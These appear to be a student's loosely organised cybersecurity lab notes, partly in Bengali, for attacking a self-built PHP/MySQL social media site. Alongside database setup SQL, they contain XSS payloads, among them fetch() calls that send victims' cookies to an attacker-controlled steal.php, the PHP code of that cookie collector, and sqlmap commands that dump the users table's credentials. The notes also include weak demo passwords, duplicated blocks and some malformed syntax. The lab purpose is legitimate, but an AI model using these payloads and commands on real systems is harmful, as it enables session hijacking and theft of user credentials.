<script>alert("Reflected XSS Works!")</script>


SET FOREIGN_KEY_CHECKS = 0;
TRUNCATE TABLE comments;
TRUNCATE TABLE likes;
TRUNCATE TABLE posts;
SET FOREIGN_KEY_CHECKS = 1;








mysql -u root -p




CREATE USER 'mintu'@'localhost' IDENTIFIED BY 'mintu123';


DROP DATABASE IF EXISTS social_media;
CREATE DATABASE social_media;
USE social_media;



CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(255) NOT NULL
);


CREATE TABLE IF NOT EXISTS posts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    content TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS comments (
    id INT AUTO_INCREMENT PRIMARY KEY,
    post_id INT NOT NULL,
    user_id INT NOT NULL,
    comment_text TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (post_id) REFERENCES posts(id) ON DELETE CASCADE,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);


SET FOREIGN_KEY_CHECKS = 0;
TRUNCATE TABLE comments;
TRUNCATE TABLE likes;
TRUNCATE TABLE posts;
SET FOREIGN_KEY_CHECKS = 1;






GRANT ALL PRIVILEGES ON social_media.* TO 'mintu'@'localhost';
FLUSH PRIVILEGES;

mysql -u mintu -p
----------------------------------
-
-TRUNCATE TABLE posts; 
-
---------------------------------


quick all comment delete


===========================================================================

XSS ------------reflected xss 

<script>alert('Comment XSS Works!')</script>
<script>window.location.href="https://www.bubt.edu.bd/"</script>
<script>alert(document.cookie)</script>


<script>alert("Stored XSS in Post: " + document.cookie)</script>


<script>
fetch("http://192.168.109.128/cyber650/my-social-attacker/steal.php?cookie=" + encodeURIComponent(document.cookie));
</script>






store based xss
======================================================================================

<script>
fetch("http://192.168.109.128/cyber650/my-social-attacker/steal.php?cookie="
+ document.cookie) ;< /script>


----------------------------------------

<script>
fetch("http://172.16.3.98/xss/xss-attacker/steal.php?cookie="
+ document.cookie) ;< /script>



steal.php  file er code
======================================================================================
<? php

if(isset($_GET['cookie'])){
$cookie = $_GET['cookie'];

$file = fopen("cookies.txt","a");
fwrite($file, $cookie . "\n");
fclose($file);

}
?>


=======================
cookies.txt   ei file attacker  machine thakebe



===================================================================================

ALLLLLLLLLLLLLLLLLLLLL SSSSSSSSSSSQQQQQLLLLLLLLLLMMMMMAAAAAAAAAPPPPPPPPPPPP

sqlmap -u "http://localhost/my-social/index.php?id=2" --dbs --batch
sqlmap -u "http://localhost/my-social/index.php?id=2" -D social_media --tables --batch
sqlmap -u "http://localhost/my-social/index.php?id=2" -D social_media -T users --columns --batch
sqlmap -u "http://localhost/cyber650/my-social/index.php?id=2" -D social_media -T users --columns
sqlmap -u "http://localhost/cyber650/my-social/index.php?id=2" -D social_media -T users -C username,pass --dump --batch




mysql -u root -p
CREATE USER 'mintu'@'localhost' IDENTIFIED BY 'mintu123';

DROP DATABASE IF EXISTS social_media;
CREATE DATABASE social_media;
USE social_media;


SET FOREIGN_KEY_CHECKS = 0;
DROP TABLE IF EXISTS comments;
DROP TABLE IF EXISTS posts;
DROP TABLE IF EXISTS users;
SET FOREIGN_KEY_CHECKS = 1;

-- ১. ফ্রেশ ইউজার টেবিল
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL
);

-- ২. ফ্রেশ পোস্ট টেবিল
CREATE TABLE posts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    content TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- ৩. ফ্রেশ কমেন্ট টেবিল
CREATE TABLE comments (
    id INT AUTO_INCREMENT PRIMARY KEY,
    post_id INT NOT NULL,
    user_id INT NOT NULL,
    comment_text TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (post_id) REFERENCES posts(id) ON DELETE CASCADE,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);


-- ৪. ল্যাব টেস্টের জন্য একটি ডেমো অ্যাকাউন্ট (User: admin, Pass: admin123)
INSERT INTO users (id, username, password) VALUES (1, 'admin', 'admin123');





-- ২.৫ ফ্রেশ লাইক টেবিল (লাইক ফিচার সচল রাখার জন্য এটি যোগ করুন)
CREATE TABLE IF NOT EXISTS likes (
    id INT AUTO_INCREMENT PRIMARY KEY,
    post_id INT NOT NULL,
    user_id INT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (post_id) REFERENCES posts(id) ON DELETE CASCADE,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    UNIQUE KEY unique_like (post_id, user_id)
);



GRANT ALL PRIVILEGES ON social_media.* TO 'mintu'@'localhost';
FLUSH PRIVILEGES;
EXIT;
=============================================================
mysql -u mintu -p



sudo chmod -R 755 /var/www/html/cyber650/my-social-attacker
sudo chown -R www-data:www-data /var/www/html/cyber650/my-social

sudo chmod -R 755 /var/www/html/cyber650/my-social-attacker
sudo chown -R www-data:www-data /var/www/html/cyber650/my-social



